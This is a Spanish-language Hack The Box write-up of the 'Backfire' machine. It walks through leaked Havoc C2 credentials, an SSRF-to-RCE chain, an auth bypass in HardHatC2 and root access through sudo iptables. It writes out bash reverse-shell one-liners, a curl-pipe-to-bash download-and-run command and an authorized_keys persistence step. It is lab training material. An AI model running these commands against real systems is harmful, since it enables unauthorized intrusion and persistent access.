---
layout: single
title: Backfire - Hack The Box
date: 2025-06-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-backfire/Backfire.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - linux
  - capabilities
  - php

---

![](/assets/images/htb-writeup-backfire/Backfire.png)

---
### 🔎 **Fase de reconocimiento**

Se hace un escaneo de `nmap` para reconocer el entorno con los parametros:
- `-sV` Para identificar las versiones de los servicios expuestos.
- `-Pn` Para omitir el ping a los hosts (asumiendo que están activos).
- `-sC` Para utilizar los scripts por defecto de `nmap`.

![](/assets/images/htb-writeup-backfire/Pasted image 20250531110346.png)

---
### 🌐 **Análisis del puerto 8000**

En el puerto 8000 nos encontramos con 2 archivos:
- `disable_tls.patch`
- `havoc.yaotl`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531110420.png)

![](/assets/images/htb-writeup-backfire/Pasted image 20250531113521.png)

Al inspeccionar el archivo `havoc.yaotl`, identificamos credenciales en texto claro:
- `ilya:CobaltStr1keSuckz!` 
- `sergej:1w4nt2sw1tch2h4rd4tc2`
Esto indica que el servidor ejecuta **Havoc C2**, una plataforma de post-explotación utilizada en entornos de Red Teaming.

![](/assets/images/htb-writeup-backfire/Pasted image 20250531113543.png)

---
### 🚨 **Explotación de Havoc C2 – SSRF a RCE**

Investigando, encontramos un repositorio que explota vulnerabilidades conocidas en Havoc C2:

[sebr-dev/Havoc-C2-SSRF-to-RCE: This is a modified version of the CVE-2024-41570 SSRF PoC from @chebuya chained with the auth RCE exploit from @hyperreality. This exploit executes code remotely to a target due to multiple vulnerabilities in Havoc C2 Framework. (https://github.com/HavocFramework/Havoc)](https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE)

Este exploit combina:
- **SSRF (Server-Side Request Forgery) – CVE-2024-41570**.
- **Bypass de autenticación y ejecución remota (RCE)**.

Creamos un payload para obtener una **reverse shell** y creamos un servidor http con python:
`echo "bash -c 'bash -i >& /dev/tcp/10.10.14.67/4444 0>&1'" > shell.sh`
`python3 -m http.server 80`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531113107.png)

Usamos las credenciales de `ilya` para ejecutar el exploit y forzar la ejecución remota:

`curl http://10.10.14.67/shell.sh | bash`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531113122.png)

✔️ **Conexión recibida correctamente:**

![](/assets/images/htb-writeup-backfire/Pasted image 20250531113136.png)

---
### 🔐 **Persistencia SSH**

Para mantener acceso, generamos un par de claves:
`ssh-keygen -t ed25519 -f ~/.ssh/backfire`
`cat ~/.ssh/backfire.pub`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531121926.png)

Luego la insertamos en la máquina víctima:
`echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJMvnl8380kaakxT3UL3asgc2ngmheBv94TmH/XpbTm kali@kali' >> ~/.ssh/authorized_keys`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531122059.png)

Ya podemos conectarnos vía SSH sin contraseña:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531122124.png)

---
### 📄 **HardHatC2 expuesto internamente**

Al leer `hardhat.txt`, descubrimos que Sergej instaló **HardHatC2** para pruebas:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531132324.png)

Comprobamos servicios internos expuestos:
`ss -tuln`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531130936.png)

Redirigimos los puertos 7096 y 5000 usando port forwarding:
`ssh -i ~/.ssh/backfire ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531133715.png)

Accedemos al panel en `https://localhost:7096`:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531133730.png)

---
### 💥 **Explotación de HardHatC2 – Auth Bypass + RCE**

Encontramos este excelente artículo con vulnerabilidades 0day en HardHatC2:
[HardHatC2 0-Days (RCE & AuthN Bypass) | by Pichaya Morimoto | สยามถนัดแฮก](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)
Vulnerabilidades destacadas:
- Arbitrary File Write
- Authentication Bypass
- Remote Code Execution (RCE)

Probamos el **bypass de autenticación**, y confirmamos que se creó el usuario `sth_pentest`:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531134353.png)

![](/assets/images/htb-writeup-backfire/Pasted image 20250531134336.png)

Accedemos al panel con:
`sth_pentest:sth_pentest`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531134416.png)

Desde la consola `/ImplantInteract`, ejecutamos: `whoami`

✔️ Somos el usuario **sergej**:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531134715.png)

---
### 🧪 **Escalada de privilegios**

Colocamos un nuevo listener en otro puerto:
`nc -nvlp 5555`

Ejecutamos el siguiente payload desde la consola interactiva:
`bash -c 'bash -i >& /dev/tcp/10.10.14.67/5555 0>&1'`

![](/assets/images/htb-writeup-backfire/Pasted image 20250531135150.png)

✔️ Obtenemos shell como `sergej`:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531135138.png)

Al verificar `sudo -l`, vemos que `sergej` puede ejecutar `/usr/sbin/iptables` como root.

`sergej@backfire:~$ sudo -l`
`Matching Defaults entries for sergej on backfire:`
    `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty`

`User sergej may run the following commands on backfire:`
    `(root) NOPASSWD: /usr/sbin/iptables`
    `(root) NOPASSWD: /usr/sbin/iptables-save`

Aprovechamos esto para escribir nuestra clave pública en `authorized_keys` como root:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531140424.png)

![](/assets/images/htb-writeup-backfire/Pasted image 20250531140525.png)

Nos conectamos vía SSH como **root**:
`ssh -i ~/.ssh/myrootkey root@backfire.htb`

📦 Leemos la flag:

![](/assets/images/htb-writeup-backfire/Pasted image 20250531140511.png)

---
## ✅ **Resumen**

- **Acceso inicial:** Havoc C2 – credenciales filtradas + CVE-2024-41570 (SSRF → RCE)
- **Persistencia:** SSH key con usuario `ilya`
- **Descubrimiento lateral:** HardHatC2 interno
- **Explotación secundaria:** Auth bypass + RCE
- **Escalada de privilegios:** Abuso de `iptables` con sudo + modificación de `authorized_keys`
- **Root access:** vía SSH con clave insertada